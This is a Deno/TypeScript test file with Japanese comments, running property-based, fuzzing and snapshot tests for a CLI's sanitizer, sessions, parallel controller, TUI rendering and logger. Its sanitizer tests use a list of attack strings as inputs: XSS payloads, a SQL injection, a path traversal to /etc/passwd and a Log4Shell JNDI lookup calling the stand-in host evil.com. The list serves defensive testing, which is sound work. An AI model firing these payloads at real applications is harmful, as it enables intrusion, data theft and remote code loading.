/**
 * プロパティベーステストとスナップショットテスト
 * @cli プロパティテストとfuzzingの実装
 */

import { assertEquals, assertExists, assertThrows } from './deps.ts';
import { MockCommandExecutor, MockFileSystem, PropertyGenerator } from './test-utils.ts';
import { LogEntry, Logger } from './logger.ts';
import { SecurityManager } from './security.ts';
import { SessionManager } from './sessionManager.ts';
import { ParallelController } from './parallelController.ts';
import { InputSanitizer } from './security.ts';
import { TEST_CONFIG } from './test-utils.ts';

/** プロパティテストの結果 */
interface PropertyTestResult {
  /** テスト名 */
  name: string;
  /** 実行回数 */
  iterations: number;
  /** 成功回数 */
  passed: number;
  /** 失敗回数 */
  failed: number;
  /** 失敗したテストケース */
  failures: Array<{ input: unknown; error: string }>;
  /** 実行時間 */
  duration: number;
}

/** スナップショット比較結果 */
interface SnapshotResult {
  /** 一致したかどうか */
  matches: boolean;
  /** 期待値 */
  expected: string;
  /** 実際の値 */
  actual: string;
  /** 差分情報 */
  diff?: string;
}

/**
 * プロパティベーステストフレームワーク
 */
export class PropertyTester {
  private generator: PropertyGenerator;
  private snapshots = new Map<string, string>();

  constructor() {
    this.generator = new PropertyGenerator();
  }

  /**
   * プロパティテストを実行
   * @param name テスト名
   * @param property テスト対象のプロパティ
   * @param iterations 実行回数
   * @returns テスト結果
   */
  async runProperty<T>(
    name: string,
    property: (input: T) => Promise<boolean> | boolean,
    generateInput: () => T,
    iterations = 100,
  ): Promise<PropertyTestResult> {
    const startTime = performance.now();
    let passed = 0;
    let failed = 0;
    const failures: Array<{ input: unknown; error: string }> = [];

    for (let i = 0; i < iterations; i++) {
      try {
        const input = generateInput();
        const result = await property(input);

        if (result) {
          passed++;
        } else {
          failed++;
          failures.push({ input, error: 'Property returned false' });
        }
      } catch (error) {
        failed++;
        failures.push({ input: 'unknown', error: error.message });
      }
    }

    const duration = performance.now() - startTime;

    return {
      name,
      iterations,
      passed,
      failed,
      failures,
      duration,
    };
  }

  /**
   * Fuzzingテストを実行
   * @param name テスト名
   * @param target テスト対象関数
   * @param inputGenerator 入力生成関数
   * @param iterations 実行回数
   * @returns テスト結果
   */
  async fuzzTest<T, R>(
    name: string,
    target: (input: T) => Promise<R> | R,
    inputGenerator: () => T,
    iterations = 1000,
  ): Promise<PropertyTestResult> {
    const startTime = performance.now();
    let passed = 0;
    let failed = 0;
    const failures: Array<{ input: unknown; error: string }> = [];

    for (let i = 0; i < iterations; i++) {
      try {
        const input = inputGenerator();
        await target(input);
        passed++;
      } catch (error) {
        failed++;
        failures.push({ input: inputGenerator(), error: error.message });
      }
    }

    const duration = performance.now() - startTime;

    return {
      name,
      iterations,
      passed,
      failed,
      failures,
      duration,
    };
  }

  /**
   * スナップショットテストを実行
   * @param name スナップショット名
   * @param actual 実際の値
   * @param update スナップショットを更新するか
   * @returns 比較結果
   */
  snapshot(name: string, actual: unknown, update = false): SnapshotResult {
    const actualStr = this.serializeForSnapshot(actual);
    const expected = this.snapshots.get(name);

    if (!expected || update) {
      this.snapshots.set(name, actualStr);
      return {
        matches: true,
        expected: actualStr,
        actual: actualStr,
      };
    }

    const matches = expected === actualStr;

    return {
      matches,
      expected,
      actual: actualStr,
      diff: matches ? undefined : this.generateDiff(expected, actualStr),
    };
  }

  /**
   * スナップショットをファイルに保存
   * @param filePath ファイルパス
   */
  async saveSnapshots(filePath: string): Promise<void> {
    const data = Object.fromEntries(this.snapshots);
    await Deno.writeTextFile(filePath, JSON.stringify(data, null, 2));
  }

  /**
   * スナップショットをファイルから読み込み
   * @param filePath ファイルパス
   */
  async loadSnapshots(filePath: string): Promise<void> {
    try {
      const content = await Deno.readTextFile(filePath);
      const data = JSON.parse(content);
      this.snapshots = new Map(Object.entries(data));
    } catch {
      // ファイルが存在しない場合は無視
    }
  }

  /**
   * オブジェクトをスナップショット用に直列化
   * @param value 値
   * @returns 直列化された文字列
   */
  private serializeForSnapshot(value: unknown): string {
    return JSON.stringify(value, null, 2);
  }

  /**
   * 差分を生成
   * @param expected 期待値
   * @param actual 実際の値
   * @returns 差分文字列
   */
  private generateDiff(expected: string, actual: string): string {
    const expectedLines = expected.split('\n');
    const actualLines = actual.split('\n');
    const diff: string[] = [];

    const maxLines = Math.max(expectedLines.length, actualLines.length);

    for (let i = 0; i < maxLines; i++) {
      const expectedLine = expectedLines[i] || '';
      const actualLine = actualLines[i] || '';

      if (expectedLine !== actualLine) {
        diff.push(`Line ${i + 1}:`);
        diff.push(`- ${expectedLine}`);
        diff.push(`+ ${actualLine}`);
      }
    }

    return diff.join('\n');
  }
}

/**
 * セキュリティ関連のプロパティテスト
 */
export class SecurityPropertyTests {
  private tester: PropertyTester;
  private sanitizer: InputSanitizer;

  constructor() {
    this.tester = new PropertyTester();
    this.sanitizer = new InputSanitizer();
  }

  /**
   * 入力サニタイゼーションのプロパティテスト
   */
  async testInputSanitizationProperties(): Promise<PropertyTestResult[]> {
    const results: PropertyTestResult[] = [];

    // プロパティ1: サニタイズ後の出力は常に安全である
    results.push(
      await this.tester.runProperty(
        'sanitization-safety',
        (input: string) => {
          const result = this.sanitizer.sanitizeText(input);
          // サニタイズ後にスクリプトタグが含まれていないことを確認
          return !result.value.includes('<script>') &&
            !result.value.includes('javascript:') &&
            !result.value.includes('onload=');
        },
        () => this.generateMaliciousInput(),
        500,
      ),
    );

    // プロパティ2: サニタイズ処理は冪等である
    results.push(
      await this.tester.runProperty(
        'sanitization-idempotent',
        (input: string) => {
          const first = this.sanitizer.sanitizeText(input);
          const second = this.sanitizer.sanitizeText(first.value);
          return first.value === second.value;
        },
        () => this.generateMaliciousInput(),
        200,
      ),
    );

    // プロパティ3: 空文字列は空文字列のまま
    results.push(
      await this.tester.runProperty(
        'sanitization-empty',
        () => {
          const result = this.sanitizer.sanitizeText('');
          return result.value === '' && !result.changed;
        },
        () => '',
        10,
      ),
    );

    return results;
  }

  /**
   * ファイル名サニタイゼーションのプロパティテスト
   */
  async testFilenameSanitizationProperties(): Promise<PropertyTestResult[]> {
    const results: PropertyTestResult[] = [];

    // プロパティ1: サニタイズ後のファイル名は安全な文字のみ
    results.push(
      await this.tester.runProperty(
        'filename-safety',
        (input: string) => {
          const result = this.sanitizer.sanitizeFilename(input);
          const dangerousChars = /[<>:"/\\|?*]/;
          return !dangerousChars.test(result);
        },
        () => this.generateDangerousFilename(),
        300,
      ),
    );

    // プロパティ2: 長すぎるファイル名は切り詰められる
    results.push(
      await this.tester.runProperty(
        'filename-length-limit',
        (input: string) => {
          const result = this.sanitizer.sanitizeFilename(input);
          return result.length <= 255;
        },
        () => 'a'.repeat(Math.floor(Math.random() * 1000) + 256),
        100,
      ),
    );

    return results;
  }

  /**
   * 悪意のある入力を生成
   */
  private generateMaliciousInput(): string {
    const maliciousPatterns = [
      '<script>alert("xss")</script>',
      'javascript:alert(1)',
      '<img src=x onerror=alert(1)>',
      "'; DROP TABLE users; --",
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      '<iframe src="javascript:alert(1)"></iframe>',
      'onload="alert(1)"',
      '<svg onload=alert(1)>',
      'data:text/html,<script>alert(1)</script>',
    ];

    const generator = new PropertyGenerator();
    const randomIndex = Math.floor(Math.random() * maliciousPatterns.length);
    const basePattern = maliciousPatterns[randomIndex];

    // パターンにランダムな文字を追加
    const prefix = generator.randomString(Math.floor(Math.random() * 10));
    const suffix = generator.randomString(Math.floor(Math.random() * 10));

    return prefix + basePattern + suffix;
  }

  /**
   * 危険なファイル名を生成
   */
  private generateDangerousFilename(): string {
    const dangerousChars = '<>:"/\\|?*';
    const generator = new PropertyGenerator();

    let filename = '';
    const length = Math.floor(Math.random() * 300) + 10;

    for (let i = 0; i < length; i++) {
      if (Math.random() < 0.3) {
        // 30%の確率で危険な文字を挿入
        filename += dangerousChars[Math.floor(Math.random() * dangerousChars.length)];
      } else {
        // 通常の文字
        filename += generator.randomString(
          1,
          'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.',
        );
      }
    }

    return filename;
  }
}

/**
 * セッション管理のプロパティテスト
 */
export class SessionPropertyTests {
  private tester: PropertyTester;
  private sessionManager: SessionManager;
  private generator: PropertyGenerator;

  constructor() {
    this.tester = new PropertyTester();
    this.sessionManager = new SessionManager(TEST_CONFIG);
    this.generator = new PropertyGenerator();
  }

  /**
   * セッション状態遷移のプロパティテスト
   */
  async testSessionStateProperties(): Promise<PropertyTestResult[]> {
    await this.sessionManager.init();
    const results: PropertyTestResult[] = [];

    try {
      // プロパティ1: セッションIDは常に一意である
      results.push(
        await this.tester.runProperty(
          'session-id-uniqueness',
          async () => {
            const session1 = await this.sessionManager.createSession({
              threadId: this.generator.randomString(20),
              repository: 'test-repo',
              userId: 'test-user',
              guildId: 'test-guild',
              channelId: 'test-channel',
            });

            const session2 = await this.sessionManager.createSession({
              threadId: this.generator.randomString(20),
              repository: 'test-repo',
              userId: 'test-user',
              guildId: 'test-guild',
              channelId: 'test-channel',
            });

            return session1.id !== session2.id;
          },
          () => undefined,
          50,
        ),
      );

      // プロパティ2: 作成されたセッションは常に取得可能
      results.push(
        await this.tester.runProperty(
          'session-retrievability',
          async () => {
            const session = await this.sessionManager.createSession({
              threadId: this.generator.randomString(20),
              repository: 'test-repo',
              userId: 'test-user',
              guildId: 'test-guild',
              channelId: 'test-channel',
            });

            const retrieved = await this.sessionManager.getSession(session.id);
            return retrieved !== null && retrieved.id === session.id;
          },
          () => undefined,
          30,
        ),
      );
    } finally {
      this.sessionManager.dispose();
    }

    return results;
  }
}

/**
 * 並列制御のプロパティテスト
 */
export class ParallelControlPropertyTests {
  private tester: PropertyTester;
  private controller: ParallelController;

  constructor() {
    this.tester = new PropertyTester();
    this.controller = new ParallelController(TEST_CONFIG);
  }

  /**
   * 並列制御のプロパティテスト
   */
  async testParallelControlProperties(): Promise<PropertyTestResult[]> {
    const results: PropertyTestResult[] = [];

    try {
      // プロパティ1: 実行中セッション数は最大値を超えない
      results.push(
        await this.tester.runProperty(
          'max-sessions-limit',
          async () => {
            const sessionIds = Array.from({ length: 10 }, () => crypto.randomUUID());

            // 全セッションの実行を要求
            const promises = sessionIds.map((id) =>
              this.controller.requestExecution(id, Math.floor(Math.random() * 10) + 1)
            );

            await Promise.all(promises);

            const stats = this.controller.getQueueStats();
            return stats.running <= TEST_CONFIG.parallel.maxSessions;
          },
          () => undefined,
          20,
        ),
      );

      // プロパティ2: セッション完了後は実行中カウントが減る
      results.push(
        await this.tester.runProperty(
          'session-completion-decreases-count',
          async () => {
            const sessionId = crypto.randomUUID();

            await this.controller.requestExecution(sessionId);
            const statsBefore = this.controller.getQueueStats();

            await this.controller.completeExecution(sessionId);
            const statsAfter = this.controller.getQueueStats();

            return statsAfter.running <= statsBefore.running;
          },
          () => undefined,
          30,
        ),
      );
    } finally {
      this.controller.dispose();
    }

    return results;
  }
}

/**
 * TUIコンポーネントのスナップショットテスト
 */
export class TUISnapshotTests {
  private tester: PropertyTester;

  constructor() {
    this.tester = new PropertyTester();
  }

  /**
   * TUIレンダリング結果のスナップショットテスト
   */
  testTUISnapshots(): SnapshotResult[] {
    const results: SnapshotResult[] = [];

    // セッションテーブルのレンダリング
    const sessionTableOutput = this.renderSessionTable([
      {
        id: 'session-1',
        threadId: 'thread-123',
        repository: 'test-repo',
        state: 'running',
        uptime: '00:05:23',
      },
      {
        id: 'session-2',
        threadId: 'thread-456',
        repository: 'another-repo',
        state: 'waiting',
        uptime: '00:01:45',
      },
    ]);

    results.push(this.tester.snapshot('session-table', sessionTableOutput));

    // ログビューのレンダリング
    const logViewOutput = this.renderLogView([
      { timestamp: '12:01:23', level: 'INFO', message: 'Session started', sessionId: 'session-1' },
      {
        timestamp: '12:01:24',
        level: 'DEBUG',
        message: 'Container created',
        sessionId: 'session-1',
      },
      {
        timestamp: '12:01:25',
        level: 'ERROR',
        message: 'Connection failed',
        sessionId: 'session-2',
      },
    ]);

    results.push(this.tester.snapshot('log-view', logViewOutput));

    return results;
  }

  /**
   * セッションテーブルをレンダリング（簡易版）
   */
  private renderSessionTable(
    sessions: Array<{
      id: string;
      threadId: string;
      repository: string;
      state: string;
      uptime: string;
    }>,
  ): string {
    const lines = [
      '┌────────┬────────────┬───────────┬────────┬─────────┐',
      '│ Sel ▶  │ Thread ID  │ Repository│ Status │ Uptime  │',
      '├────────┼────────────┼───────────┼────────┼─────────┤',
    ];

    for (const session of sessions) {
      const statusIcon = session.state === 'running' ? '🟢' : '⏸️';
      const shortThreadId = session.threadId.substring(0, 10);
      const shortRepo = session.repository.substring(0, 10);

      lines.push(
        `│   ▷    │ ${shortThreadId}│ ${shortRepo.padEnd(10)}│ ${statusIcon} ${
          session.state.padEnd(4)
        }│ ${session.uptime}│`,
      );
    }

    lines.push('└────────┴────────────┴───────────┴────────┴─────────┘');

    return lines.join('\n');
  }

  /**
   * ログビューをレンダリング（簡易版）
   */
  private renderLogView(
    logs: Array<{
      timestamp: string;
      level: string;
      message: string;
      sessionId: string;
    }>,
  ): string {
    const lines = [
      '┌─ Logs [INFO+] ──────────────────────────────────────┐',
    ];

    for (const log of logs) {
      const levelIcon = log.level === 'ERROR' ? '❌' : log.level === 'DEBUG' ? '🐛' : 'ℹ️';
      const shortSessionId = log.sessionId.substring(0, 8);

      lines.push(
        `│ ${log.timestamp} ${levelIcon} [${log.level.padEnd(5)}] [${shortSessionId}] ${
          log.message.padEnd(20)
        } │`,
      );
    }

    lines.push('└─────────────────────────────────────────────────────┘');

    return lines.join('\n');
  }
}

// テスト実行
Deno.test('プロパティテスト - セキュリティ', async () => {
  const securityTests = new SecurityPropertyTests();

  const sanitizationResults = await securityTests.testInputSanitizationProperties();
  for (const result of sanitizationResults) {
    console.log(`${result.name}: ${result.passed}/${result.iterations} passed`);
    assertEquals(result.failed, 0, `Property test failed: ${result.name}`);
  }

  const filenameResults = await securityTests.testFilenameSanitizationProperties();
  for (const result of filenameResults) {
    console.log(`${result.name}: ${result.passed}/${result.iterations} passed`);
    assertEquals(result.failed, 0, `Property test failed: ${result.name}`);
  }
});

Deno.test('プロパティテスト - セッション管理', async () => {
  const sessionTests = new SessionPropertyTests();

  const results = await sessionTests.testSessionStateProperties();
  for (const result of results) {
    console.log(`${result.name}: ${result.passed}/${result.iterations} passed`);
    assertEquals(result.failed, 0, `Property test failed: ${result.name}`);
  }
});

Deno.test('プロパティテスト - 並列制御', async () => {
  const parallelTests = new ParallelControlPropertyTests();

  const results = await parallelTests.testParallelControlProperties();
  for (const result of results) {
    console.log(`${result.name}: ${result.passed}/${result.iterations} passed`);
    assertEquals(result.failed, 0, `Property test failed: ${result.name}`);
  }
});

Deno.test('スナップショットテスト - TUI', async () => {
  const tuiTests = new TUISnapshotTests();

  await tuiTests.tester.loadSnapshots('./snapshots.json');
  const results = tuiTests.testTUISnapshots();

  for (const result of results) {
    if (!result.matches) {
      console.log(`Snapshot mismatch: ${result.diff}`);
    }
    assertEquals(result.matches, true, 'Snapshot test failed');
  }

  await tuiTests.tester.saveSnapshots('./snapshots.json');
});

Deno.test('Fuzzingテスト - Logger', async () => {
  const tester = new PropertyTester();
  const logger = new Logger('DEBUG', '/tmp/test-logs');
  const generator = new PropertyGenerator();

  await logger.init();

  try {
    const result = await tester.fuzzTest(
      'logger-fuzzing',
      (input: { message: string; context?: Record<string, unknown> }) => {
        logger.info(input.message, input.context);
        return true;
      },
      () => ({
        message: generator.randomString(Math.floor(Math.random() * 1000)),
        context: Math.random() > 0.5
          ? {
            randomKey: generator.randomString(50),
            randomNumber: Math.random() * 1000,
            randomArray: [generator.randomString(10), generator.randomString(10)],
          }
          : undefined,
      }),
      500,
    );

    console.log(`Logger fuzzing: ${result.passed}/${result.iterations} passed`);

    // エラー率が5%以下であることを確認
    const errorRate = result.failed / result.iterations;
    assertEquals(errorRate < 0.05, true, `Error rate too high: ${errorRate}`);
  } finally {
    logger.cleanup();
  }
});
